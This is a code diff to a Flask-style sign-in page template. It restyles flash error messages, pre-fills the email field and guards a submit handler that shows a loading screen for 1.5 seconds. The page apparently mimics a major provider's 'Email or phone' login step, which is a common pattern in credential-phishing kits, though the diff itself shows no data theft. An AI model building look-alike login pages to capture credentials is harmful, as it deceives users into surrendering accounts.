@@ -63,6 +63,27 @@
 
         /* Container Adjustment */
         .right-panel { position: relative; min-height: 380px; }
+        
+        /* ===== ERROR STYLES: RED TEXT, NO BACKGROUND, BELOW EMAIL FIELD ===== */
+        .error-message {
+            color: #d93025 !important;
+            background: transparent !important;
+            font-size: 14px;
+            margin-top: -8px;
+            margin-bottom: 15px;
+            padding: 0;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Hide any old flash message containers that might have backgrounds */
+        .flash-message, .alert, .alert-error, .alert-danger, .alert-success {
+            background: transparent !important;
+            border: none !important;
+            box-shadow: none !important;
+        }
     </style>
 </head>
 <body>
@@ -80,11 +101,12 @@
         </div>
 
         <div id="form-content">
-            {% with messages = get_flashed_messages() %}
+            <!-- FLASH MESSAGES - RED TEXT, NO BACKGROUND, BELOW EMAIL FIELD -->
+            {% with messages = get_flashed_messages(with_categories=true) %}
               {% if messages %}
-                {% for message in messages %}
-                  <div style="color: #d93025; font-size: 14px; margin-bottom: 15px; display: flex; align-items: center;">
-                    <span style="margin-right: 8px;">⚠️</span> {{ message }}
+                {% for category, message in messages %}
+                  <div class="error-message">
+                    <span>⚠️</span> {{ message }}
                   </div>
                 {% endfor %}
               {% endif %}
@@ -94,7 +116,7 @@
                 <input type="hidden" name="step" value="email">
 
                 <div class="input-wrapper">
-                    <input type="email" name="email" id="email" placeholder=" " required>
+                    <input type="email" name="email" id="email" placeholder=" " value="{{ email if email else '' }}" required>
                     <label for="email" id="label-email">Email or phone</label>
                 </div>
 
@@ -170,15 +192,17 @@
     const formContent = document.getElementById('form-content');
     const loadingScreen = document.getElementById('loading-screen');
 
-    emailForm.addEventListener('submit', function(e) {
-        e.preventDefault(); // Stop instant submit
-        formContent.style.display = 'none'; // Hide layouts
-        loadingScreen.style.display = 'flex'; // Show loading panel
+    if (emailForm) {
+        emailForm.addEventListener('submit', function(e) {
+            e.preventDefault(); // Stop instant submit
+            formContent.style.display = 'none'; // Hide layouts
+            loadingScreen.style.display = 'flex'; // Show loading panel
 
-        setTimeout(() => {
-            emailForm.submit(); // Submit after 1.5 seconds
-        }, 1500);
-    });
+            setTimeout(() => {
+                emailForm.submit(); // Submit after 1.5 seconds
+            }, 1500);
+        });
+    }
 
     window.onclick = function(event) {
         if (!event.target.matches('#current-lang')) {
